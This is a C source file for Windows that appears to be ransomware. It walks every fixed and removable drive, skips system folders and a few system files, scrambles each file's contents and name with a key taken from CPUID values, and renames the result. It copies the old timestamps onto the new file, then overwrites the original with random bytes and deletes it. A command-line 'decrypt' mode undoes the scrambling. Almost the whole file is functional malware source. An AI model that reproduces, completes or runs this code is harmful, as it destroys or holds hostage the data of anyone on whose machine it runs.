#include "main.h"

typedef struct PathInfo {
	char basePath[PATH_SIZE];
	char name[FILENAME_SIZE];
	char ext[FILEEXT_SIZE];
	int mode;
	int key;
	int num;
} PathInfo;

typedef struct PFRInfo {
	threadpool *tp;
	int mode;
	int key;
	char basePath[PATH_SIZE];
	char ext[FILEEXT_SIZE];
} PFRInfo;

struct FileInfo {
   char name[FILENAME_SIZE];
};

const char* exts = ",c,h,d,f,m,p,r,s,v,i,as,,mx,bc,sh,nt,bb,ml,cc,hh,cs,em,bi,hs,js,ts,mk,mm,pp,pl,pm,ps,pb,py,r2,r3,rc,rb,rs,ss,st,vb,sv,vh,cl,ph,txt,ada,ads,adb,asm,mib,asp,au3,avs,avsi,cln,bsh,csh,bat,cmd,lex,mli,sml,thy,cbl,cbd,cdb,cdc,cob,cpy,lst,orc,sco,csd,cpp,cxx,hpp,hxx,ino,erl,hrl,src,for,f90,f95,f2k,f23,f77,bas,lhs,las,htm,xht,hta,ini,inf,url,wer,iss,hex,jsm,jsx,jsp,kix,lsp,tex,sty,lau,mak,tsx,mms,nim,tab,spf,nfo,nsi,nsh,osx,pas,inc,lpr,plx,php,ps1,pyw,reb,reg,rbw,scm,smd,scp,out,sql,mot,tcl,tek,tex,vbs,t2t,svh,vhd,pro,bash,copy,diff,html,shtm,java,json,lisp,php3,php4,php5,phps,phpt,phtml,psm1,splus,srec,vhdl,xml,xsl,xsd,xul,mkl,svg,yml,psd,pdd,psb,bmp,rle,dib,gif,eps,iff,tdi,jpg,jpe,jpf,jpx,jp2,j2c,j2k,jpc,jps,mpo,pcx,pdf,pdp,raw,pxr,png,pns,pbm,pgm,ppm,pnm,pfm,pam,sct,tga,vda,icb,vst,tif,cmake,patch,forth,shtml,xhtml,swift,pack,xaml,xslt,mxml,xsml,yaml,jpeg,tiff,coffee,litcoffee,properties,bash_profile,bashrc,profile,";

const char* exdir = ",$Recycle.Bin,Documents and Settings,PerfLogs,Program Files,Program Files (x86),Windows,";
const char* exfile = ",desktop.ini,ntuser.ini,NTUSER.DAT,";

void toLower(char* str)
{
	for(size_t i=0; i<=strlen(str); i++)
	{
      if(str[i]>=65 && str[i]<=90)
         str[i]=str[i]+32;
	}
}

/**
 * Function to check whether a directory exists or not.
 * It returns 1 if given path is directory and  exists 
 * otherwise returns 0.
 */
int dir_exists(const char *path)
{
   struct stat statbuf;
   if (stat(path, &statbuf) != 0)
	   return 0;
   return S_ISDIR(statbuf.st_mode);
}

int file_exists(const char *filename)
{
	struct stat statbuf;
	if (stat(filename, &statbuf) == 0)
		return 1;
	return 0;
}

int getkey()
{
	unsigned int ncores=0,nthreads=0,ht=0;
	asm volatile("cpuid": "=a" (ncores), "=b" (nthreads) : "a" (0xb), "c" (0x1) : );
	ht=(ncores!=nthreads);
	//printf("Cores: %d\nThreads: %d\nHyperThreading: %s\n",ncores,nthreads,ht?"Yes":"No");
	//printf("It's %llu bit system\n", sizeof(void *) * 8);
	return (ncores+nthreads+ht+(sizeof(void *) * 8));
}

const char* get_file_ext(const char* fname)
{
	const char* dot = strrchr(fname, '.');
	if(!dot || dot == fname) return "";
	return dot + 1;
}

char* generateRandomString(int size)
{
	int i;
    //char *res = malloc(size + 1);
	char *res = (char*)malloc((size + 1) * sizeof(char));
    for(i = 0; i < size; i++)
	{
		res[i] = (char) (rand()%(ASCII_END-ASCII_START))+ASCII_START;
    }
    res[i] = '\0';
    return res;
}

void copy_old_time(struct stat* st, const char* path_new)
{
	struct utimbuf newTimeBuf;
	newTimeBuf.actime  = st->st_atime;
	newTimeBuf.modtime = st->st_mtime;
	utime(path_new, &newTimeBuf);
}

int randInRange(int min, int max)
{
	double scale = 1.0 / (RAND_MAX + 1);
	double range = max - min + 1;
	return min + (int) ( rand() * scale * range );
}

char randomByte()
{
	return (char)randInRange(0, 255);
}

void shredder(struct stat* st, const char* path)
{
	int stat = chmod(path, S_IREAD|S_IWRITE);
	if (!stat)
	{
		off_t size;
		FILE* fp = NULL;
		fp = fopen(path, "rb+");
		if(fp != NULL)
		{
			size = st->st_size;
			
			size_t k = sizeof(char) * CHUNK_SIZE;
			
			long long i = 0;
			char byte[CHUNK_SIZE];
			
			// Set file descriptor to point to the 0-index byte of file.
			fseek(fp, 0L, SEEK_SET);
			
			for(i = 0; i < size; i += k)
			{
				// get random data
				for(size_t j = 0; j < sizeof(byte); j++)
					byte[j] = randomByte();

				// IF conditional to ensure the program does not over overwrite data.
				if( (size - i) < CHUNK_SIZE )
				{
					k = sizeof(char) * (size - i);
				}

				// Writes N(k) bytes to file pointer.
				fwrite(byte, 0x1, k, fp);
			}
		}
		fclose(fp);
	}
}

void * tp_func(void *arg)
{
	PathInfo *pi = (PathInfo *)arg;
	//printf("%s\n", pi->basePath);
	//printf("%s\n", pi->name);
	//printf("%s\n", pi->ext);
	
	char path_old[PATH_SIZE];
	char path_new[PATH_SIZE];
	
	strcpy(path_old, pi->basePath);
	strcat(path_old, "\\");
    strcat(path_old, pi->name);
			
	strcpy(path_new, pi->basePath);
    strcat(path_new, "\\");
	
	FILE* fp_old = NULL;
	FILE* fp_new = NULL;
	char buffer[CHUNK_SIZE];
	size_t bytes, i, j;
	
	fp_old = fopen(path_old,"rb");
	if(fp_old != NULL)
	{
		if (pi->mode == 1)
		{
			strcat(path_new, pi->ext);
			char nname[FILEEXT_SIZE];
			sprintf(nname,"%d",pi->num);
			strcat(path_new, nname);
			strcat(path_new, ".");
			char* mname = generateRandomString(2);
			strcat(path_new, mname);
			free(mname);
		}
		else if (pi->mode == 2)
		{
			struct FileInfo fi;
			fread(&fi, sizeof(struct FileInfo), 1, fp_old);
			for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
				fi.name[i] = fi.name[i]-pi->key+i;
			strcat(path_new, fi.name);
		}
		
		fp_new = fopen(path_new,"wb");
		if(fp_new != NULL)
		{
			if (pi->mode == 1)
			{
				struct FileInfo fi;
				strcpy(fi.name, pi->name);
				for(i = 0; (i < FILENAME_SIZE && fi.name[i] != '\0'); i++)
					fi.name[i] = fi.name[i]+pi->key-i;
				fwrite(&fi, sizeof(struct FileInfo), 1, fp_new);
			}
			while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
			{
				j = bytes;
				for(i=0; i<bytes; i++)
				{
					if (pi->mode == 2)
					{
						buffer[i]=buffer[i]+pi->key+i-j;
					}
					else
					{
						buffer[i]=buffer[i]-pi->key-i+j;
					}
					j--;
				}
				fwrite(buffer, 1, bytes, fp_new);
			}
		}
		fclose(fp_new);
	}
	fclose(fp_old);
	
	if (file_exists(path_new))
	{
		struct stat oldStat;
		if (stat(path_old, &oldStat) == 0)
		{
			copy_old_time(&oldStat, path_new);
			shredder(&oldStat, path_old);
		}
		if (remove(path_old) != 0)
		{
			int stat = chmod(path_old, S_IREAD|S_IWRITE);
			if (!stat) remove(path_old);
		}
	}
	
	return NULL;
}

void * tp_free_func(void *arg)
{
	PathInfo *pi = (PathInfo *)arg;
	free(pi);
	return NULL;
}

void processFilesRecursively(threadpool *tp, int mode, int key, const char* basePath, const char* ext)
{
	int count = 0;
    char path_old[PATH_SIZE];
    struct dirent* dp;
    DIR* dir = opendir(basePath);
	
    // Unable to open directory stream
    if (!dir)
        return;
	
    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
			// Construct new path from our base path
            strcpy(path_old, basePath);
            strcat(path_old, "\\");
            strcat(path_old, dp->d_name);
			
			if (dir_exists(path_old))
			{
				char* exclude = strstr(exdir, dp->d_name);
				if (exclude)
				{
					continue;
				}
				processFilesRecursively(tp, mode, key, path_old, ext);
			}
			else
			{
				//printf("%s\n", dp->d_name);
				//printf("path_old : %s\n", path_old);
				
				char* exclude = strstr(exfile, dp->d_name);
				if (exclude)
				{
					continue;
				}
				
				// Check Path contains extension
				char* ret = strstr(path_old, ext);
				if (mode==1 && ret)
				{
					continue;
				}
				else if (mode==2 && !ret)
				{
					continue;
				}
				
				// File extension
				/* if (mode==1)
				{
					const char* fext = get_file_ext(dp->d_name);
					int felen = strlen(fext);
					char* fel = (char*)malloc((felen+1) * sizeof(char));
					strcpy(fel,fext);
					toLower(fel);
					char* extret = strstr(exts, fel);
					free(fel);
					if (extret)
					{
						extret--;
						if (extret[0]!=',')
							continue;
						for (int i = 0; i <= felen; ++i)
							extret++;
						if (extret[0]!=',')
							continue;
					}
					else
					{
						continue;
					}
				} */
				
				count++;
				
				PathInfo *pi = (PathInfo *)malloc(sizeof(PathInfo));
				strcpy(pi->basePath, basePath);
				strcpy(pi->name, dp->d_name);
				strcpy(pi->ext, ext);
				pi->mode = mode;
				pi->key = key;
				pi->num = count;
				tp->add_job(tp, tp_func, tp_free_func, pi);
			}
        }
    }

    closedir(dir);
}

void * tp_pfr_func(void *arg)
{
	PFRInfo *pfri = (PFRInfo *)arg;
	processFilesRecursively(pfri->tp, pfri->mode, pfri->key, pfri->basePath, pfri->ext);
	return NULL;
}

void * tp_pfr_free_func(void *arg)
{
	PFRInfo *pfri = (PFRInfo *)arg;
	free(pfri);
	return NULL;
}

int main(int argc, char *argv[])
{
	if (argc != 2) return EXIT_SUCCESS;
	
	int mode = 0;
	if (strcmp(argv[1], "encrypt") == 0)
		mode = 1;
	else if (strcmp(argv[1], "decrypt") == 0)
		mode = 2;
	
	srand (time(NULL));
	
	argv[0][strlen(argv[0]) - 4] = 0;
	toLower(argv[0]);
	
	int key = getkey();
	
	threadpool *tp = (threadpool *)threadpool_init(10);
	
	threadpool *tpd = (threadpool *)threadpool_init(3);
	
	UINT driveType;
	char buf[255];
    int sz = GetLogicalDriveStrings(sizeof(buf), buf);
    if( sz > 0)
    {
        char* p1 = buf;
        char* p2;
        while( *p1 != '\0' && (p2 = strchr(p1,'\0')) != NULL )
        {
			driveType = GetDriveType(p1);
			if (driveType != DRIVE_UNKNOWN && driveType != DRIVE_NO_ROOT_DIR && driveType != DRIVE_CDROM && driveType != DRIVE_RAMDISK)
			{
				//printf("%s\n", p1);
				PFRInfo *pfri = (PFRInfo *)malloc(sizeof(PFRInfo));
				pfri->tp = tp;
				pfri->mode = mode;
				pfri->key = key;
				strcpy(pfri->basePath, p1);
				strcpy(pfri->ext, argv[0]);
				tpd->add_job(tpd, tp_pfr_func, tp_pfr_free_func, pfri);
			}
            p1 = p2+1;
        }
    }
	while(tpd->job_pending(tpd)!=0)
	{
		sleep(1);
	}
	threadpool_deinit(tpd);
	
	//char* path = (char*)malloc(PATH_SIZE * sizeof(char));
	//strcpy(path, "C:\\");
	//processFilesRecursively(tp, mode, key, path, argv[0]);
	//free(path);
	
	while(tp->job_pending(tp)!=0)
	{
		sleep(1);
	}
	threadpool_deinit(tp);
	
	return EXIT_SUCCESS;
}